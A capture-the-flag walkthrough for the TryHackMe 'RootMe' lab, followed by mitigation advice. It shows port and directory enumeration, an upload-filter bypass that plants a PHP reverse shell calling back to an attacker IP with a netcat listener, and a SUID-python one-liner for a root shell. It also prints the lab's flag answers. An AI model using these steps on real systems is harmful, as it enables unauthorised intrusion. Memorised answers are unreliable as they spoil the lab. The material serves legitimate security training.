# RootMe CTF Walkthrough

**Target:** RootMe  
**Source:** [TryHackMe](https://tryhackme.com/room/rrootme)  
**Difficulty:** Easy  
**Target IP:** 10.114.191.94

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Reverse Shell Upload](#reverse-shell-upload)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

RootMe is an easy Linux box aimed at beginners, themed around a vulnerable file
upload panel. The objective is to gain a foothold on the system and escalate to
root, capturing both the user and root flags. The attack chain covers service
enumeration to discover an Apache web server, directory brute-forcing to find a
hidden upload `/panel/`, bypassing a weak upload filter with a `.php5` reverse
shell to land a `www-data` foothold, and abuse of a misconfigured SUID `python`
binary (a GTFOBins technique) for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory enumeration
- File upload filter bypass via alternate PHP extensions
- Reverse-shell delivery and TTY stabilisation
- SUID binary discovery
- Linux privilege escalation via SUID `python` (GTFOBins)

---

## Reconnaissance

### Network Scanning

```bash
nmap 10.114.191.94
```

**Results:**

| Port | Service |
|------|---------|
| 22/tcp | ssh |
| 80/tcp | http |

> **Q — Scan the machine, how many ports are open?** → `2`

A service/version scan confirms the running software:

```bash
nmap -sV -T5 10.114.191.94
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Q — What version of Apache is running?** → `2.4.41`  
> **Q — What service is running on port 22?** → `SSH`

Two ports are open. With no obvious SSH vector, the **HTTP server on port 80** is
the entry point.

---

## Web Enumeration

### Directory Brute Force

Gobuster is run against the web server to map the application:

```bash
gobuster dir -u http://10.114.191.94 -w /usr/share/wordlists/dirb/common.txt -t 5
```

```
.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
css                  (Status: 301) [--> http://10.114.191.94/css/]
index.php            (Status: 200) [Size: 616]
js                   (Status: 301) [--> http://10.114.191.94/js/]
panel                (Status: 301) [--> http://10.114.191.94/panel/]
server-status        (Status: 403) [Size: 278]
uploads              (Status: 301) [--> http://10.114.191.94/uploads/]
```

Two directories stand out: a `/panel/` page and an `/uploads/` directory.

> **Q — What is the hidden directory?** → `/panel/`

### Inspecting the Panel

Curling the panel reveals a file upload form:

```bash
curl http://10.114.191.94/panel/
```

```html
<title>HackIT - Home</title>
...
<form action="" method="POST" enctype="multipart/form-data">
    <p>Select a file to upload:</p>
    <input type="file" name="fileUpload" class="fileUpload">
    <input type="submit" value="Upload" name="submit">
</form>
```

The panel accepts file uploads, and the `/uploads/` directory found earlier is
where uploaded files land — a classic upload-to-RCE path.

> **Application:** HackIT file upload panel at `/panel/`, files served from `/uploads/`

---

## Reverse Shell Upload

The standard PHP reverse shell is copied and renamed with a `.php5` extension to
bypass the upload filter that blocks plain `.php`:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php5
```

Edit the shell to point at the attacker's IP and listener port:

```php
$ip = '192.168.132.9';  // attacker IP
$port = 9090;           // listener port
```

Upload `shell.php5` through the panel at `http://10.114.191.94/panel/`, then
start a listener:

```bash
rlwrap nc -nvlp 9090
```

Trigger the shell by requesting it from the uploads directory:

```
http://10.114.191.94/uploads/shell.php5
```

A shell returns to the listener:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.191.94] 46124
$ whoami
www-data
```

> **Foothold:** `www-data`

Stabilise the TTY for a more usable shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## User Flag

The user flag is located by searching the filesystem:

```bash
find / -name user.txt 2>/dev/null
```

```
/var/www/user.txt
```

```bash
cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

> **User flag:** `THM{y0u_g0t_a_sh3ll}`

---

## Privilege Escalation

### Finding SUID Binaries

Enumerate root-owned binaries with the SUID bit set:

```bash
find / -user root -perm /4000 2>/dev/null
```

Among the usual system binaries, one entry is out of place:

```
/usr/bin/python2.7
```

A SUID `python` binary is highly unusual and dangerous — Python can execute
arbitrary code, so the SUID bit lets a low-privileged user run code as root.

> **Q — Search for files with SUID permissions, which file is weird?** → `/usr/bin/python`

### Exploiting SUID Python

SUID `python` is a documented [GTFOBins](https://gtfobins.github.io/gtfobins/python/)
technique. The `os.execl` call with `-p` preserves the elevated privileges and
drops into a root shell:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```

The root flag is then read directly:

```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

> **Root flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `THM{y0u_g0t_a_sh3ll}` | `/var/www/user.txt` |
| Root flag | `THM{pr1v1l3g3_3sc4l4t10n}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Unrestricted File Upload (Critical)

**Description:** The `/panel/` upload form accepted executable PHP files. A weak
extension filter was bypassed by using the alternate `.php5` extension, and
uploaded files were stored in a web-accessible `/uploads/` directory where they
could be executed.

**Impact:** Remote code execution as `www-data`, providing the initial foothold.

**Mitigation:**
- Validate uploads by content type and a strict extension allowlist, rejecting
  all PHP-executable extensions (`.php`, `.php3`, `.php4`, `.php5`, `.phtml`).
- Store uploads outside the web root or in a directory configured to never
  execute scripts.
- Rename uploaded files and strip executable permissions.

### 2. SUID Misconfiguration — `python` GTFOBins (Critical)

**Description:** The `/usr/bin/python2.7` binary had the SUID bit set and was
owned by root. Python can execute arbitrary code, so any user could spawn a root
shell with `os.execl("/bin/sh", "sh", "-p")`.

**Impact:** Full privilege escalation from `www-data` to `root`.

**Mitigation:**
- Remove the SUID bit from interpreters and other binaries that can execute
  arbitrary code (`chmod u-s /usr/bin/python2.7`).
- Audit SUID binaries regularly against the GTFOBins project.
- Apply least privilege; never set SUID on general-purpose interpreters.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH 22, HTTP 80 / Apache 2.4.41)
    ↓
Gobuster → /panel/ upload form + /uploads/ directory
    ↓
Upload php-reverse-shell as shell.php5 (filter bypass)
    ↓
Trigger /uploads/shell.php5 → reverse shell as www-data
    ↓
User flag: THM{y0u_g0t_a_sh3ll} (/var/www/user.txt)
    ↓
find SUID binaries → /usr/bin/python2.7 (weird)
    ↓
python -c 'import os; os.execl("/bin/sh","sh","-p")' → root shell
    ↓
Root flag: THM{pr1v1l3g3_3sc4l4t10n} (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| Gobuster | Web directory enumeration |
| curl | Inspecting the upload panel |
| php-reverse-shell | Reverse-shell payload |
| Netcat (rlwrap nc) | Reverse-shell listener |
| python (pty) | TTY stabilisation and SUID privilege escalation |
| find | SUID binary discovery |

---

## References

- [TryHackMe — RootMe](https://tryhackme.com/room/rrootme)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/)
- [PentestMonkey — php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

---
